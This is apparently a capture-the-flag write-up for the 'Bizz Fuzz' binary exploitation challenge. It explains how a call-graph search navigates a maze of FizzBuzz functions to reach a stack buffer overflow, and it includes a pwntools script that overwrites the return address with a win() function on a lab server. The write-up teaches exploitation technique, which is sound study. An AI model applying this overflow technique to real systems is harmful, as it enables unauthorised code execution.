# CyLab — Bizz Fuzz

* **Platform:** CyLab Security Academy / picoCTF (Challenge ID: `181`)
* **Category:** Binary Exploitation / Graph Navigation & Stack Smashing (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, radare2, NetworkX, objdump
* **Binary:** `vuln` (32-bit x86 ELF, stripped, ~726 functions)

---

## TL;DR

The binary is a massive maze composed of over 720 stripped functions simulating a recursive FizzBuzz quiz tree. A centralized engine `game(arg)` evaluates user input against FizzBuzz sequences; answering correctly returns `arg`, while answering incorrectly at prompt $k$ returns $k$, branching down different execution paths. Graph analysis using `networkx` reconstructs the call-graph from `main` to find an isolated vulnerability: function `fcn.0808ba1f` contains an unbounded `fgets(s, 348)` into a 99-byte stack buffer (`[ebp-0x63]`). By sending a precomputed 627-line input sequence to navigate the maze, we reach the vulnerable function and overwrite the return address with `win()` at `0x08049206` to display the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., stripped

$ checksec --file=vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
1. **No Canary & No PIE:** Fixed base address at `0x08048000` with no stack cookies.
2. **Obfuscation through Scale:** The executable contains hundreds of auto-generated functions that call `game()` with different threshold parameters.
3. **Dedicated Flag Routine:** An unstripped symbol / string analysis reveals a win routine at `0x08049206` that opens `"flag.txt"` and prints its contents.

---

## Static Analysis & Vulnerability

### 1. The Maze Game Engine (`game()` at `0x08049261`)

The core game logic takes an integer `n`:
- Prompts for `1?`, `2?`, `3?` up to `(n-1)?`.
- Reads strings via `scanf("%9s")` and checks against standard FizzBuzz rules:
  - Multiples of 3: `"fizz"`
  - Multiples of 5: `"buzz"`
  - Multiples of 15: `"fizzbuzz"`
  - Others: decimal string of the number.
- **Return Value:**
  - If the player answers all questions correctly, returns `n`.
  - If the player errs at step $k$, returns $k$.

Functions in the binary use conditional checks on `game()`'s return value to either return to the caller or branch into deeper child routines:

```text
  caller()
    |
    +---> game(20) == 20 ? return
    |
    +---> game(20) == 1  ? call vulnerable_function()
    |
    +---> default: call child_function()
```

### 2. Locating the Vulnerability

Scanning assembly instructions for large stack reads:
```bash
$ objdump -d vuln | grep "0x15c"
  808ba5c:  push 0x15c          ; 348 bytes
  808ba61:  push eax            ; buffer at ebp-0x63
  808ba62:  call 8049070 <fgets@plt>
```

Function `fcn.0808ba1f` allocates a 99-byte buffer at `[ebp-0x63]` and reads 348 bytes via `fgets()`.
Offset to saved EIP:
$$\text{Offset} = 0\text{x}63 + 4 = 99 + 4 = 103 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

### 1. Call-Graph Pathfinding (BFS)

We parse all function call edges using a Python script with `networkx`:
- **Source:** `main` (`0x0814cdd8`)
- **Destination:** `fcn.0808ba1f`

The shortest directed path through the graph:
$$\text{main} \longrightarrow \text{fcn.0813d5dc} \longrightarrow \text{fcn.08144ba9} \longrightarrow \text{fcn.08131f64} \longrightarrow \text{fcn.0810aab4} \longrightarrow \text{fcn.0808ba1f}$$

```text
  main (0x0814cdd8)
    |  (Pass first 35 stages correctly to reach 0x0813d5dc)
    v
  fcn.0813d5dc
    |  (Fail game at target step)
    v
  fcn.08144ba9
    |
    v
  fcn.08131f64
    |
    v
  fcn.0810aab4
    |  (game(0x2e) must return exactly 5: answer 1..4 correctly, fail at 5)
    v
  fcn.0808ba1f  <-- VULNERABLE FUNCTION (fgets stack overflow)
    |
    +---> Smash return address to win() at 0x08049206
```

### 2. Navigating the Sequence

We generate 627 precise input lines:
- Answering valid FizzBuzz tokens to pass functions that must be skipped.
- Purposely failing at specific indices to navigate down desired branches.
- In `fcn.0810aab4`, we answer `1`, `2`, `fizz`, `4`, and then send an invalid token to force return value 5.

### 3. Payload Delivery

Upon reaching `fcn.0808ba1f`, the function runs `scanf("%9s")` followed by `fgets()` on the same input stream.
We deliver both inputs on a single line:
```text
"x " + "A" * 102 + p32(0x08049206)
```
- `scanf` consumes `"x"`, causing `game` to return 1.
- `fgets` immediately reads the remaining `" " + "A"*102 + address`, cleanly overwriting the return address with `win()` (`0x08049206`).

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST, PORT = "chatelaine.cylabacademy.net", 33411
WIN_ADDR = 0x08049206

def generate_fizzbuzz_inputs():
    # Precomputed traversal path generated via NetworkX call-graph solver
    with open("path_inputs.txt", "r") as f:
        return [line.strip().encode() for line in f]

def solve(io):
    inputs = generate_fizzbuzz_inputs()
    log.info(f"Streaming {len(inputs)} navigation inputs...")

    for line in inputs[:-1]:
        io.sendline(line)

    # Final stage payload: token 'x' for scanf + padding + win address for fgets
    final_payload = b"x " + b"A" * 102 + p32(WIN_ADDR)
    io.sendline(final_payload)

    data = io.recvall(timeout=4)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33411: Done
[*] Streaming 627 navigation inputs...
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33411
```

---

## Key Takeaways & Lessons

1. **Automated Graph-Based Navigation:** When binaries use state-machine complexity or hundreds of branched functions to disguise vulnerabilities, graph theory algorithms (BFS/DFS via NetworkX) automate the generation of deterministic navigation sequences.
2. **Combined `scanf` and `fgets` Buffering:** Because `scanf("%s")` consumes whitespace-delimited tokens while leaving remaining line characters in `stdin`, multiple consecutive input functions can be targeted in a single synchronized payload line.
3. **Static Analysis of Large Binaries:** Searching for anomalous constants (such as buffer allocation sizes `0x15c` or `fopen("flag.txt")`) quickly pinpoints vulnerable functions without manually reversing hundreds of decoy routines.
